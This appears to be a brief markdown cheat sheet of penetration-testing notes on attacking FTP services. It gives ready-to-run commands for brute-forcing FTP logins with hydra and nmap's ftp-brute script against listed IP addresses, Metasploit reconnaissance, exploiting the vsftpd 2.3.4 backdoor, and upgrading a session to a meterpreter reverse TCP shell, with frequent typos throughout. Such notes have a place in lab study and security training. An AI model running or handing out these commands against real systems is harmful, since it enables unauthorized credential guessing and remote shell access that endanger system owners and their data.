# Exploiting FTP

__Brup force attack on ftp__
- __`hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ftp`__

__Burp force attack using nmap__
  > save the target user in usr file
  - __`nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0.1.22  -o namp`__


__metasploit Framework__
information garthing
```
service postgresql start
msfconsole
workspace -a ftp
db_nmap -sV -O -sS -p- <target ip>
analy
vulns
services
```
exploting 
```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target ip>
exploit
```
using post meterpreter reverse tcp to get the shell
to use this you need to have the access to the target system
```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set LHOST <yourip>
set SESSION <uid number that you have access to the target system> ---> use sessions to get the uid
exploit
```
 
